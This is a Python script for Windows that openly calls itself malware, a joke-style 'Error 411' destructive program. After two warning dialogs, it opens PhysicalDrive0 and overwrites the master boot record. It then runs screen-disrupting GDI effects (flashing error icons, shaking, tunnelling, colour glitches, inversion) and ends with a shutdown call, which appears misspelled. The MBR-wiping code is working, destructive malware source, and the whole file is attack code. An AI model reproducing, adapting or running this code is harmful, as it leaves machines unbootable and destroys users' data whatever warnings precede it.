from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
from random import *
import time
import os

# this malware lasts 1 minute and 21 seconds before killing Windows

def main():
    if MessageBox("WARNING! The software you just executed is considered MALWARE and this malware will make your computer unusable. This warning is here to protect you from destroying your computer.", "WARNING!", MB_ICONWARNING | MB_YESNO) == 7: # no
        return
    if MessageBox("If you read the previous warning and have a virtual machine ready, up and running, like Windows Sandbox, VirtualBox or VMware Player, or VMware Workstation is all safe enviroments to run this. THIS IS THE LAST WARNING BEFORE RUNNING.", "Last Warning!", MB_ICONWARNING | MB_YESNO) == 7: # no
        return
    # starts overwriting mbr (destructive)
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
    WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
    CloseHandle(hDevice) # Close the handle to our Physical Drive
    # payload code(s)
    payload_error_icons()
    time.sleep(20)
    payload_shake()
    time.sleep(20)
    payload_utunnel()
    time.sleep(20)
    payload_glitch()
    time.sleep(20)
    payload_invertio()
    time.sleep(1)
    # this last payload is also destructive as it shutdown the system with no mbr
    payload_death_shutdown()
    MessageBox("Error 411 will now TERMINATE THE SYSTEM", "Error 411 and the fate of your computer", MB_ICONWARNING | MB_OK)


def shake():
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    dc = GetDC(0)
    StretchBlt(dc, randrange(50), randrange(50), x, y, dc, -20, -20, x+40, y+40, SRCCOPY)
    DeleteDC(dc)
    

def draw_icon():
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    dc = GetDC(0)
    IconError = LoadIcon(None, 32513)
    DrawIcon(dc, randrange(x), randrange(y), IconError)
    DeleteDC(dc)

def draw_icon_question():
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    dc = GetDC(0)
    IconError = LoadIcon(None, 32514)
    DrawIcon(dc, randrange(x), randrange(y), IconError)
    DeleteDC(dc)

def draw_icon_warn():
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    dc = GetDC(0)
    IconError = LoadIcon(None, 32515)
    DrawIcon(dc, randrange(x), randrange(y), IconError)
    DeleteDC(dc)

def payload_error_icons():
    for i in range(20):
        draw_icon()
        time.sleep(0.3)
        draw_icon_warn()
        time.sleep(0.3)
        draw_icon_question()
        time.sleep(0.4)

def payload_shake():
    for i in range(200):
        shake()
        time.sleep(0.1)

def payload_death_shutdown():
    InitateSystemShutdown()

def payload_invertio():
    for i in range(200):
        invert_onetime()
        time.sleep(0.1)

def payload_utunnel():
    for i in range(200):
        invert_onetime()
        draw_icon()
        draw_icon_warn()
        draw_icon_question()
        tunneling()
        time.sleep(0.1)

def payload_glitch():
    dc = GetDC(0)
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    for i in range(0, 200):
        brush = CreateSolidBrush(RGB(
        255,
        155,
        0,
        ))
        SelectObject(dc, brush)
        PatBlt(dc, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
        DeleteObject(brush)
        brush = CreateSolidBrush(RGB(
        155,
        255,
        0,
        ))
        SelectObject(dc, brush)
        PatBlt(dc, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
        DeleteObject(brush)
        brush = CreateSolidBrush(RGB(
        0,
        255,
        0,
        ))
        SelectObject(dc, brush)
        PatBlt(dc, randrange(x), randrange(y), randrange(x), randrange(x), PATINVERT)
        DeleteObject(brush)
        brush = CreateSolidBrush(RGB(
        255,
        255,
        255,
        ))
        SelectObject(dc, brush)
        PatBlt(dc, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
        DeleteObject(brush)
        brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
        SelectObject(dc, brush)
        PatBlt(dc, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
        DeleteObject(brush)
        time.sleep(0.1)
        
def invert_onetime():
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    dc = GetDC(0)
    BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
    DeleteDC(dc)

def tunneling():
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    dc = GetDC(0)
    StretchBlt(dc, 0, 0, x, y, dc, -20, -20, x+40, y+40, SRCCOPY)
    DeleteDC(dc)


main()
